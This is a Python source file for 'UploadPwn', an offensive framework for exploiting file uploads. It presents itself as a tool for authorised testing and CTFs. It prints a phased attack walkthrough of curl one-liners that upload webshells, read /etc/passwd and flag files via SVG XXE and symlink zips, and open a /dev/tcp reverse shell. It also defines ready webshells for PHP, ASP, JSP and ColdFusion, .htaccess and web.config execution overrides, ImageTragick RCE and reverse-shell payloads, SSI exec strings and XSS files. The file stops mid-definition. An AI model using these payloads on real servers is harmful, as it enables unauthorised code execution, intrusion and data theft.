#!/usr/bin/env python3
"""
UploadPwn v5.0 — Universal File Upload Exploitation Framework
For authorized penetration testing, CTF, and security research only.

Like nmap for upload vulns. No AI, no fluff — pure exploitation engine.
"""

import requests, sys, time, base64, threading, argparse, os, re, json, zlib
import struct, hashlib, io, zipfile, socket, ssl, string, random, copy
from urllib.parse import quote, urljoin, urlparse, unquote
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

__version__ = "6.0.0"

# ═══════════════════════════════════════════════════════════════════════════════
#  ANSI + OUTPUT ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"

# Verbosity: 0=quiet, 1=normal, 2=verbose, 3=debug
VERBOSITY = 1

def p(color, tag, msg, min_verb=1):
    if VERBOSITY >= min_verb:
        print(f"{color}{BOLD}[{tag}]{W} {msg}")

def ok(m, v=1):    p(G, "✓", m, v)
def fail(m, v=1):  p(R, "✗", m, v)
def info(m, v=1):  p(B, "*", m, v)
def warn(m, v=1):  p(Y, "!", m, v)
def pwn(m):        p(M, "!!!", m, 0)
def debug(m):      p(DIM, "DBG", m, 3)
def vuln(m):       p(R, "VULN", m, 0)

def progress(current, total, prefix="", width=40):
    if VERBOSITY < 1:
        return
    pct = current / total if total else 0
    filled = int(width * pct)
    bar = f"{'█' * filled}{'░' * (width - filled)}"
    print(f"\r  {DIM}{prefix} [{bar}] {current}/{total} ({pct*100:.0f}%){W}", end="", flush=True)
    if current >= total:
        print()

BANNER = f"""{C}{BOLD}
 ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ ██████╗ ██╗    ██╗███╗   ██╗
 ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██║    ██║████╗  ██║
 ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║██████╔╝██║ █╗ ██║██╔██╗ ██║
 ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║██╔═══╝ ██║███╗██║██║╚██╗██║
 ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝██║     ╚███╔███╔╝██║ ╚████║
  ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
                                                                    v{__version__}{W}
{DIM} Universal File Upload Exploitation Framework v{__version__} — Threaded + Smart Mode{W}
"""


# ═══════════════════════════════════════════════════════════════════════════════
#  WALKTHROUGH — Step-by-step attack methodology with one-liners
# ═══════════════════════════════════════════════════════════════════════════════

def print_walkthrough(target="http://TARGET", endpoint="/upload.php",
                      field="uploadFile"):
    """Print a complete step-by-step upload attack walkthrough with one-liners."""
    t = target
    e = endpoint
    f = field

    print(f"""
{C}{BOLD}{'═' * 72}
  UPLOADPWN — COMPLETE FILE UPLOAD ATTACK WALKTHROUGH
{'═' * 72}{W}

{Y}{BOLD}PHASE 1: RECONNAISSANCE{W}
{'─' * 72}

  {B}Step 1.1{W} — Fingerprint the server
  {G}curl -sI {t} | grep -iE 'server|x-powered|x-asp'{W}

  {B}Step 1.2{W} — Discover upload forms automatically
  {G}uploadpwn -t {t} --discover{W}

  {B}Step 1.3{W} — Enumerate upload directories
  {G}uploadpwn -t {t} --dir-enum{W}
  {DIM}# Or with custom wordlist:{W}
  {G}uploadpwn -t {t} --dir-enum --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt{W}

  {B}Step 1.4{W} — Probe for active filters
  {G}uploadpwn -t {t} -e {e} --field {f}{W}
  {DIM}# This automatically fingerprints: extension blacklist/whitelist,
  # content-type filter, MIME magic filter, size limit, SVG support{W}

  {B}Step 1.5{W} — Error-based path disclosure
  {G}uploadpwn -t {t} -e {e} --error-disclose{W}
  {DIM}# Sends malformed filenames (CON.jpg, 256-char name, null bytes)
  # to trigger error messages that leak server paths{W}

{Y}{BOLD}PHASE 2: CLIENT-SIDE BYPASS{W}
{'─' * 72}

  {B}Step 2.1{W} — Direct POST (bypasses all JS validation)
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;type=image/jpeg'{W}
  {DIM}# uploadpwn sends requests directly — client-side bypass is automatic{W}

  {B}Step 2.2{W} — Burp: Intercept & change filename
  {DIM}# 1. Upload legitimate image through browser
  # 2. Intercept in Burp, change filename to shell.php
  # 3. Forward the modified request{W}

{Y}{BOLD}PHASE 3: EXTENSION BYPASS{W}
{'─' * 72}

  {B}Step 3.1{W} — PHP alternative extensions
  {G}for ext in php php3 php4 php5 php7 php8 phtml phar pht pgif; do
    curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.'$ext';type=image/jpeg'
  done{W}

  {B}Step 3.2{W} — Case variation
  {G}for ext in PHP Php pHp phP PHp PhP pHP; do
    curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.'$ext';type=image/jpeg'
  done{W}

  {B}Step 3.3{W} — Double extension (reverse)
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php.jpg;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.jpg.php;type=image/jpeg'{W}

  {B}Step 3.4{W} — Null byte injection
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php%00.jpg;type=image/jpeg'{W}

  {B}Step 3.5{W} — Double URL-encoded null byte
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php%2500.jpg;type=image/jpeg'{W}

  {B}Step 3.6{W} — Trailing characters
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php.;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php%20;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php....;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php/;type=image/jpeg'{W}

  {B}Step 3.7{W} — NTFS Alternate Data Stream (IIS/Windows)
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.aspx::$DATA;type=image/jpeg'{W}

  {B}Step 3.8{W} — IIS semicolon trick
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.aspx;filename=shell.aspx;.jpg;type=image/jpeg'{W}
  {G}uploadpwn -t {t} -e {e} --iis-semicolon{W}

  {B}Step 3.9{W} — Full automated matrix (ALL combinations)
  {G}uploadpwn -t {t} -e {e} --matrix{W}

{Y}{BOLD}PHASE 4: CONTENT-TYPE & MIME BYPASS{W}
{'─' * 72}

  {B}Step 4.1{W} — Spoof Content-Type header
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;type=image/gif'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;type=image/png'{W}

  {B}Step 4.2{W} — GIF magic bytes + PHP
  {G}printf 'GIF89a;\\n<?php system($_GET["cmd"]); ?>' > shell.gif.php
  curl -s -X POST '{t}{e}' -F '{f}=@shell.gif.php;type=image/gif'{W}

  {B}Step 4.3{W} — PNG magic bytes + PHP
  {G}printf '\\x89PNG\\r\\n\\x1a\\n<?php system($_GET["cmd"]); ?>' > shell.png.php
  curl -s -X POST '{t}{e}' -F '{f}=@shell.png.php;type=image/png'{W}

  {B}Step 4.4{W} — JPEG magic bytes + PHP
  {G}printf '\\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>' > shell.jpg.php
  curl -s -X POST '{t}{e}' -F '{f}=@shell.jpg.php;type=image/jpeg'{W}

  {B}Step 4.5{W} — Real PNG polyglot (passes getimagesize/finfo)
  {G}uploadpwn -t {t} -e {e} --polyglot{W}
  {DIM}# Generates structurally valid PNG/JPEG/GIF with PHP in metadata{W}

{Y}{BOLD}PHASE 5: CONFIG FILE OVERWRITE{W}
{'─' * 72}

  {B}Step 5.1{W} — .htaccess (Apache) — make .jpg execute PHP
  {G}printf 'AddType application/x-httpd-php .jpg .png .gif' > .htaccess
  curl -s -X POST '{t}{e}' -F '{f}=@.htaccess;type=text/plain'
  # Then upload shell with .jpg extension
  curl -s -X POST '{t}{e}' -F '{f}=@shell.jpg;type=image/jpeg'{W}
  {G}uploadpwn -t {t} -e {e} --htaccess{W}

  {B}Step 5.2{W} — web.config (IIS) — ASP execution
  {G}uploadpwn -t {t} -e {e} --webconfig{W}

{Y}{BOLD}PHASE 6: SVG XXE / XSS / SSRF{W}
{'─' * 72}

  {B}Step 6.1{W} — SVG XXE file read (fastest CTF path)
  {G}uploadpwn -t {t} -e {e} --svg-read /flag.txt{W}
  {DIM}# One-liner:{W}
  {G}cat <<'EOF' > xxe.svg
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
EOF
  curl -s -X POST '{t}{e}' -F '{f}=@xxe.svg;type=image/svg+xml'{W}

  {B}Step 6.2{W} — SVG XXE read PHP source (find upload dir)
  {G}uploadpwn -t {t} -e {e} --svg-src upload.php{W}

  {B}Step 6.3{W} — SVG XSS
  {G}uploadpwn -t {t} -e {e} --svg-xss{W}

{Y}{BOLD}PHASE 7: ARCHIVE ATTACKS{W}
{'─' * 72}

  {B}Step 7.1{W} — Zip Slip (path traversal in zip)
  {G}uploadpwn -t {t} -e {e} --zip{W}
  {DIM}# Creates zip with ../../../var/www/html/shell.php inside{W}

  {B}Step 7.2{W} — Symlink Zip (arbitrary file read)
  {G}uploadpwn -t {t} -e {e} --symlink-zip /etc/passwd{W}
  {DIM}# One-liner (manual):{W}
  {G}ln -s /etc/passwd link.txt && zip --symlinks evil.zip link.txt
  curl -s -X POST '{t}{e}' -F '{f}=@evil.zip;type=application/zip'{W}

  {B}Step 7.3{W} — WAR deployment (Tomcat/JBoss)
  {G}uploadpwn -t {t} -e {e} --war{W}

{Y}{BOLD}PHASE 8: IMAGETRAGICK (CVE-2016-3714){W}
{'─' * 72}

  {B}Step 8.1{W} — Command injection via MVG
  {G}uploadpwn -t {t} -e {e} --imagetragick{W}

  {B}Step 8.2{W} — File read via label:@
  {G}uploadpwn -t {t} -e {e} --imagetragick-read /etc/passwd{W}

  {B}Step 8.3{W} — Reverse shell
  {G}uploadpwn -t {t} -e {e} --imagetragick-revshell 10.10.14.1:4444{W}

{Y}{BOLD}PHASE 9: ADVANCED BYPASS TECHNIQUES{W}
{'─' * 72}

  {B}Step 9.1{W} — Raw null byte in multipart header
  {G}uploadpwn -t {t} -e {e} --raw-null{W}
  {DIM}# Sends actual \\x00 byte (not %00) in Content-Disposition filename{W}

  {B}Step 9.2{W} — Chunked transfer encoding bypass
  {G}uploadpwn -t {t} -e {e} --chunked{W}
  {DIM}# Bypasses Content-Length based size filters{W}

  {B}Step 9.3{W} — Multipart boundary manipulation
  {G}uploadpwn -t {t} -e {e} --boundary{W}
  {DIM}# Double Content-Disposition, extra MIME parts to confuse WAFs{W}

  {B}Step 9.4{W} — LFI chaining (upload dir not web-accessible)
  {G}uploadpwn -t {t} -e {e} --lfi{W}
  {DIM}# Uploads shell, then tries ?file=../uploads/shell.php on every page{W}

{Y}{BOLD}PHASE 10: RACE CONDITION{W}
{'─' * 72}

  {B}Step 10.1{W} — Upload-then-access race
  {G}uploadpwn -t {t} -e {e} --race{W}
  {DIM}# Rapid upload+access threads. Wins if server validates then deletes.{W}

  {DIM}# Manual approach (two terminals):{W}
  {G}# Terminal 1: while true; do curl -s '{t}{e}' -F '{f}=@shell.php'; done
  # Terminal 2: while true; do curl -s '{t}/uploads/shell.php?cmd=id'; done{W}

{Y}{BOLD}PHASE 11: POST-EXPLOITATION{W}
{'─' * 72}

  {B}Step 11.1{W} — Interactive webshell
  {G}uploadpwn -t {t} --all --interactive{W}
  {DIM}# Built-in commands: !loot, !flag, !revshell, !download, !persist{W}

  {B}Step 11.2{W} — Quick flag grab
  {G}curl '{t}/uploads/shell.php?cmd=cat+/flag.txt'{W}

  {B}Step 11.3{W} — System enumeration
  {G}curl '{t}/uploads/shell.php?cmd=id;whoami;uname+-a;ip+a'{W}

  {B}Step 11.4{W} — Upgrade to reverse shell
  {G}curl '{t}/uploads/shell.php?cmd=bash+-c+"bash+-i+>%2526+/dev/tcp/LHOST/LPORT+0>%25261"'{W}

{Y}{BOLD}NEW: CHARACTER INJECTION BYPASS{W}
{'─' * 72}

  {B}Step 12.1{W} — Full character injection scan
  {G}uploadpwn -t {t} -e {e} --char-inject{W}
  {DIM}# Tests all permutations of %20, %0a, %00, %0d0a, /, .\\, ., ..., :
  # injected in 4 positions across PHP and image extensions
  # Example bypasses: shell.php%00.jpg, shell.jpg%0a.php, shell.php:.jpg{W}

  {B}Step 12.2{W} — Manual character injection (curl)
  {G}curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php%00.jpg;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php%0a.jpg;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php%0d%0a.jpg;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.jpg%00.php;type=image/jpeg'
  curl -s -X POST '{t}{e}' -F '{f}=@shell.php;filename=shell.php:.jpg;type=image/jpeg'{W}

{Y}{BOLD}NEW: SMART MODE — AUTO-PICK BEST ATTACKS{W}
{'─' * 72}

  {G}uploadpwn -t {t} --smart --interactive{W}
  {DIM}# Probes filters first, then auto-selects the attack chain with
  # the highest chance of success. Skips attacks that can't work.
  # Much faster than --all because it doesn't waste time on dead ends.{W}

  {DIM}# With auth:{W}
  {G}uploadpwn -t {t} --login /login.php --user admin --pass admin --smart{W}

{Y}{BOLD}THE NUCLEAR OPTION — RUN EVERYTHING{W}
{'─' * 72}

  {G}uploadpwn -t {t} --all --interactive -vv{W}
  {DIM}# Runs every module: fingerprint → error disclosure → dir enum →
  # SVG XXE → .htaccess → web.config → char injection → polyglots →
  # raw null → chunked → boundary → IIS → WAR → zip → symlink →
  # imagetragick → race condition → LFI → full matrix → shell{W}

  {DIM}# Smart mode (recommended — faster + smarter):{W}
  {G}uploadpwn -t {t} --smart --interactive -v{W}

  {DIM}# With auth:{W}
  {G}uploadpwn -t {t} --login /login.php --user admin --pass admin \\
    --upload-page /profile --all --interactive -vv{W}

  {DIM}# Through Burp proxy:{W}
  {G}uploadpwn -t {t} --all --proxy http://127.0.0.1:8080 --interactive{W}

{C}{BOLD}{'═' * 72}{W}
""")


# ═══════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════

# -- PHP extensions (comprehensive) --
PHP_EXTS = [
    ".php", ".php3", ".php4", ".php5", ".php7", ".php8",
    ".phtml", ".phar", ".phps", ".pht", ".pgif", ".inc", ".module",
    ".PHP", ".Php", ".pHp", ".phP", ".PHp", ".PhP", ".pHP", ".PHp3",
    ".pHtMl", ".PHTML", ".PHAR",
]

# -- ASP/ASPX extensions --
ASP_EXTS = [
    ".asp", ".aspx", ".ashx", ".asmx", ".ascx", ".cshtml", ".vbhtml",
    ".ASP", ".ASPX", ".Asp", ".Aspx",
]

# -- JSP extensions (comprehensive including missing ones) --
JSP_EXTS = [
    ".jsp", ".jspx", ".jsw", ".jsv", ".jtml", ".jhtml",
    ".JSP", ".JSPX", ".Jsp",
]

# -- ColdFusion extensions (was completely missing) --
CF_EXTS = [".cfm", ".cfml", ".cfc", ".dbm", ".CFM", ".CFML"]

# -- Node/Python/Ruby/Perl --
OTHER_EXTS = [
    ".js", ".mjs", ".py", ".rb", ".pl", ".cgi", ".sh", ".bash",
    ".shtml", ".shtm", ".stm", ".xhtml",
]

# -- Image extensions for double-extension tricks --
IMG_EXTS = [".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".svg", ".ico", ".tiff"]

# -- Allowed archives --
ARCHIVE_EXTS = [".zip", ".tar", ".gz", ".tar.gz", ".war", ".jar", ".rar", ".7z"]

# -- Content-Type values --
CT_IMAGE = [
    "image/jpeg", "image/jpg", "image/png", "image/gif", "image/webp",
    "image/svg+xml", "image/bmp", "image/tiff", "image/x-icon",
]
CT_MISC = [
    "application/octet-stream", "text/plain", "multipart/form-data",
    "application/x-php", "text/html", "application/pdf",
    "application/x-httpd-php",
]
CT_ARCHIVE = [
    "application/zip", "application/java-archive",
    "application/x-tar", "application/gzip",
    "application/x-war-archive",
]

# -- Injection characters for filename manipulation --
INJECT_CHARS = [
    "%20", "%0a", "%00", "%0d%0a", "/", ".\\", " ", ".",
    "...", "::", "::$DATA",
]

# -- Default shell directories to probe --
DEFAULT_SHELL_DIRS = [
    "/uploads/", "/upload/", "/files/", "/images/", "/media/",
    "/tmp/", "/assets/uploads/", "/storage/", "/public/uploads/",
    "/avatars/", "/attachments/", "/static/", "/data/", "/userfiles/",
    "/profile_images/", "/content/", "/documents/", "/img/",
    "/wp-content/uploads/", "/sites/default/files/",
    "/app/uploads/", "/var/uploads/", "/public/images/",
    "/resources/", "/assets/images/", "/user/", "/photos/",
]

# -- LFI parameter names to try --
LFI_PARAMS = [
    "file", "page", "include", "path", "dir", "document", "folder",
    "root", "pg", "style", "pdf", "template", "php_path", "doc",
    "img", "filename", "url", "lang", "language", "site", "read",
    "content", "download", "cat", "action", "board", "date",
    "detail", "item", "name", "view", "load", "fetch",
]

# -- Windows reserved device names --
WIN_RESERVED = ["CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3",
                "COM4", "LPT1", "LPT2", "LPT3", "CLOCK$"]

# -- Common wordlist paths --
WORDLIST_PATHS = [
    "/usr/share/wordlists/dirb/common.txt",
    "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
    "/usr/share/seclists/Discovery/Web-Content/common.txt",
    "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt",
]

# -- User-Agent rotation --
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

# -- Extended Content-Type list for fuzzing --
CT_IMAGE_EXTENDED = [
    "image/jpeg", "image/jpg", "image/png", "image/gif", "image/webp",
    "image/bmp", "image/tiff", "image/x-icon", "image/svg+xml",
    "image/avif", "image/apng", "image/vnd.microsoft.icon",
    "image/x-png", "image/pjpeg", "image/x-citrix-jpeg",
    "image/x-citrix-png", "image/x-ms-bmp",
]


# ═══════════════════════════════════════════════════════════════════════════════
#  UPLOAD TARGET — Represents a discovered upload surface
# ═══════════════════════════════════════════════════════════════════════════════

class UploadTarget:
    """Represents one discovered upload surface (form or AJAX)."""
    def __init__(self, endpoint_url, field_name="uploadFile", method="post",
                 extra_fields=None, page_url="", accept_attr="", js_source="",
                 form_method="post"):
        self.endpoint_url = endpoint_url
        self.field_name = field_name
        self.method = method          # "form" or "ajax"
        self.extra_fields = extra_fields or {}
        self.page_url = page_url
        self.accept_attr = accept_attr
        self.js_source = js_source
        self.form_method = form_method  # "get" or "post"

    def __repr__(self):
        return (f"UploadTarget(endpoint={self.endpoint_url!r}, field={self.field_name!r}, "
                f"method={self.method!r}, page={self.page_url!r})")


# ═══════════════════════════════════════════════════════════════════════════════
#  HUMAN-IN-THE-LOOP — Interactive prompts when auto-detection fails
# ═══════════════════════════════════════════════════════════════════════════════

class HumanInTheLoop:
    """Interactive helper that asks the user when auto-detection fails."""

    def __init__(self, enabled=True):
        self.enabled = enabled

    def ask(self, question, default=None):
        """Ask user a question. Returns default if non-interactive."""
        if not self.enabled:
            return default
        try:
            prompt = f"\n{Y}{BOLD}  [?] {question}{W}"
            if default:
                prompt += f" {DIM}[default: {default}]{W}"
            prompt += f"\n  {C}>{W} "
            answer = input(prompt).strip()
            return answer if answer else default
        except (KeyboardInterrupt, EOFError):
            print()
            return default

    def ask_endpoint(self, context=""):
        """Ask for the upload endpoint URL."""
        msg = "Could not auto-detect the upload endpoint."
        if context:
            msg += f"\n  {DIM}Context: {context}{W}"
        msg += "\n  Enter the upload URL (e.g. /upload.php) or press Enter to skip:"
        return self.ask(msg)

    def ask_field(self):
        """Ask for the upload field name."""
        return self.ask("Could not detect upload field name. Enter it:", default="uploadFile")

    def ask_choice(self, question, choices):
        """Present choices to the user."""
        if not self.enabled:
            return choices[0] if choices else None
        print(f"\n{Y}{BOLD}  [?] {question}{W}")
        for i, choice in enumerate(choices, 1):
            print(f"    {C}{i}.{W} {choice}")
        try:
            answer = input(f"  {C}>{W} ").strip()
            if answer.isdigit() and 1 <= int(answer) <= len(choices):
                return choices[int(answer) - 1]
            return choices[0]
        except (KeyboardInterrupt, EOFError):
            print()
            return choices[0]

    def notify(self, message):
        """Print a guidance message to the user."""
        print(f"\n{Y}{BOLD}  [GUIDANCE]{W} {message}")

    def ask_confirm(self, question):
        """y/n confirmation prompt."""
        if not self.enabled:
            return True
        try:
            answer = input(f"\n{Y}{BOLD}  [?] {question} [Y/n]{W} ").strip().lower()
            return answer != 'n'
        except (KeyboardInterrupt, EOFError):
            print()
            return True


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD GENERATORS
# ═══════════════════════════════════════════════════════════════════════════════

# -- PHP shells --
SHELLS_PHP = {
    "system":     b"<?php system($_GET['cmd']); ?>",
    "tiny":       b"<?=`$_GET[0]`?>",
    "passthru":   b"<?php passthru($_GET['cmd']); ?>",
    "exec":       b"<?php echo exec($_GET['cmd']); ?>",
    "popen":      b"<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
    "shell_exec": b"<?php echo shell_exec($_GET['cmd']); ?>",
    "proc_open":  b"<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=proc_open($_GET['cmd'],$d,$pipes);echo stream_get_contents($pipes[1]);?>",
    "preg":       b"<?php preg_replace('/.*/e',$_GET['cmd'],'');?>",  # PHP <7
    "assert":     b"<?php @assert($_GET['cmd']);?>",                    # PHP <7.2
}

# -- PHP shells with magic bytes prepended --
SHELLS_PHP_MAGIC = {
    "gif_system":   b"GIF89a;\n<?php system($_GET['cmd']); ?>",
    "gif_tiny":     b"GIF89a;\n<?=`$_GET[0]`?>",
    "gif_popen":    b"GIF89a;\n<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
    "png_system":   b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>",
    "png_tiny":     b"\x89PNG\r\n\x1a\n<?=`$_GET[0]`?>",
    "jpeg_system":  b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
    "jpeg_tiny":    b"\xff\xd8\xff\xe0<?=`$_GET[0]`?>",
    "pdf_system":   b"%PDF-1.4\n<?php system($_GET['cmd']); ?>",
    "bmp_system":   b"BM<?php system($_GET['cmd']); ?>",
}

# -- ASP/ASPX shells --
SHELLS_ASP = {
    "asp_cmd": b'<%Response.Write(CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")).StdOut.ReadAll())%>',
    "aspx_cmd": b'<%@ Page Language="C#"%><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>',
    "aspx_eval": b'<%@ Page Language="C#"%><%@ Import Namespace="System.Diagnostics"%><%Response.Write(Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd());%>',
}

# -- JSP shells --
SHELLS_JSP = {
    "jsp_runtime": b'<%Runtime r=Runtime.getRuntime();Process p=r.exec(request.getParameter("cmd"));java.io.InputStream is=p.getInputStream();java.util.Scanner s=new java.util.Scanner(is).useDelimiter("\\\\A");out.println(s.hasNext()?s.next():"");%>',
    "jsp_processbuilder": b'<%ProcessBuilder pb=new ProcessBuilder(request.getParameter("cmd").split(" "));pb.redirectErrorStream(true);Process p=pb.start();java.io.InputStream is=p.getInputStream();java.util.Scanner s=new java.util.Scanner(is).useDelimiter("\\\\A");out.println(s.hasNext()?s.next():"");%>',
}

# -- ColdFusion shells --
SHELLS_CF = {
    "cfm_exec": b'<cfexecute name="cmd.exe" arguments="/c #URL.cmd#" timeout="5" variable="output"><cfoutput>#output#</cfoutput>',
    "cfm_exec_linux": b'<cfexecute name="/bin/bash" arguments="-c #URL.cmd#" timeout="5" variable="output"><cfoutput>#output#</cfoutput>',
}

# -- SVG payloads --
def svg_xxe_file(path):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://{path}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

def svg_xxe_b64(path):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={path}"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

def svg_xxe_expect(cmd):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "expect://{cmd}"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text></svg>""".encode()

SVG_XSS = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle r="50"/></svg>'

def svg_ssrf(url):
    return f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "{url}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'.encode()

# -- .htaccess payloads --
HTACCESS_PAYLOADS = [
    b"AddType application/x-httpd-php .jpg .jpeg .png .gif .svg .xml .xxx .txt\n",
    b"AddHandler application/x-httpd-php .jpg .jpeg .png .gif\n",
    b'<FilesMatch ".">\nSetHandler application/x-httpd-php\n</FilesMatch>\n',
    b"Options +ExecCGI\nAddHandler php-script .jpg .png .gif\n",
    b"AddHandler php5-script .jpg\nAddHandler php7-script .jpg\n",
    # php-fpm variant
    b'<FilesMatch ".*">\nSetHandler "proxy:unix:/run/php/php-fpm.sock|fcgi://localhost"\n</FilesMatch>\n',
]

# -- web.config payload --
WEBCONFIG = b"""<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="wc" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll"
resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
</handlers><security><requestFiltering><fileExtensions>
<remove fileExtension=".config"/></fileExtensions></requestFiltering>
</security></system.webServer></configuration>
<!--<%Response.Write(CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")).StdOut.ReadAll())%>-->"""

# -- ImageTragick payloads --
def imagetragick_rce(cmd):
    return f"""push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/oops.jpg"|{cmd}")'
pop graphic-context""".encode()

def imagetragick_label_read(filepath):
    return f"""push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@{filepath}'
pop graphic-context""".encode()

def imagetragick_revshell(ip, port):
    cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return imagetragick_rce(cmd)

def imagetragick_ephemeral_read(filepath):
    """MSL variant for reading files via ImageMagick."""
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="{filepath}"/>
<write filename="/tmp/uploadpwn_out.txt"/>
</image>""".encode()


# -- .user.ini payload (Nginx/PHP-FPM equivalent of .htaccess) --
USERINI_PAYLOADS = [
    b"auto_prepend_file=shell.gif\n",
    b"auto_append_file=shell.gif\n",
    b"auto_prepend_file=shell.jpg\n",
    b"auto_prepend_file=shell.png\n",
]

# -- SSI (Server Side Include) payloads --
SSI_PAYLOADS = {
    "cmd_exec": b'<!--#exec cmd="id" -->',
    "cmd_ls": b'<!--#exec cmd="ls -la" -->',
    "cmd_cat": b'<!--#exec cmd="cat /etc/passwd" -->',
    "include": b'<!--#include virtual="/etc/passwd" -->',
}

# -- PDF XSS payload --
def make_pdf_xss():
    """Create a minimal PDF with embedded JavaScript for XSS."""
    return b"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
4 0 obj<</Type/Action/S/JavaScript/JS(app.alert('XSS'))>>endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000074 00000 n
0000000120 00000 n
0000000179 00000 n
trailer<</Size 5/Root 1 0 R>>
startxref
245
%%EOF"""

# -- HTML XSS payloads for file upload --
HTML_XSS_PAYLOADS = {
